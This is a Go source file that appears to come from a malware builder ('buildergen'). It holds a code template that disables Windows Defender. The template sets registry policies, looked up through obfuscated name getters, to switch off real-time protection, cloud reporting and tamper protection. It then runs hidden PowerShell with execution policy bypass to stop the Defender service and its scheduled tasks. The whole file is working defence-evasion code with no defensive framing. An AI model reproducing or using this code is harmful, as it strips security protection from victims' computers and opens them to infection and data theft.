package buildergen

import "strings"

func templateDefenderKill() string {
	return strings.TrimSpace(`
func disableDefenderFull() {
	if !isAdmin() {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regSetValueEx := advapi32.NewProc(getRegSetValueExWName())
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
	regCreateKeyEx := advapi32.NewProc(getRegCreateKeyExWName())

	setDword := func(root uint32, subKey, valueName string, value uint32) {
		keyPath, _ := syscall.UTF16PtrFromString(subKey)
		var hKey syscall.Handle
		var disp uint32
		ret, _, _ := regCreateKeyEx.Call(
			uintptr(root),
			uintptr(unsafe.Pointer(keyPath)),
			0, 0, 0,
			uintptr(0x20006),
			0,
			uintptr(unsafe.Pointer(&hKey)),
			uintptr(unsafe.Pointer(&disp)),
		)
		if ret != 0 {
			ret, _, _ = regOpenKeyEx.Call(uintptr(root), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20006), uintptr(unsafe.Pointer(&hKey)))
			if ret != 0 {
				return
			}
		}
		defer regCloseKey.Call(uintptr(hKey))
		valName, _ := syscall.UTF16PtrFromString(valueName)
		data := value
		regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 4, uintptr(unsafe.Pointer(&data)), 4)
	}

	defenderPolicies := getDefenderPoliciesPath()
	rtpPolicies := getDefenderRtpPath()
	spynetPolicies := getDefenderSpynetPath()

	dv := getDefenderValues()
	if len(dv) >= 11 {
		setDword(0x80000002, defenderPolicies, dv[0], 1)
		setDword(0x80000002, defenderPolicies, dv[1], 1)
		setDword(0x80000002, defenderPolicies, dv[2], 0)

		setDword(0x80000002, rtpPolicies, dv[3], 1)
		setDword(0x80000002, rtpPolicies, dv[4], 1)
		setDword(0x80000002, rtpPolicies, dv[5], 1)
		setDword(0x80000002, rtpPolicies, dv[6], 1)
		setDword(0x80000002, rtpPolicies, dv[7], 1)

		setDword(0x80000002, spynetPolicies, dv[8], 0)
		setDword(0x80000002, spynetPolicies, dv[9], 2)

		setDword(0x80000002, getTamperProtectionPath(), dv[10], 0)
	}

	stopCmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
		"-Command", getStopDefenderServiceCmd())
	_ = stopCmd.Run()

	disableTaskCmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
		"-Command", getDisableDefenderTasksCmd())
	_ = disableTaskCmd.Run()
}
`)
}
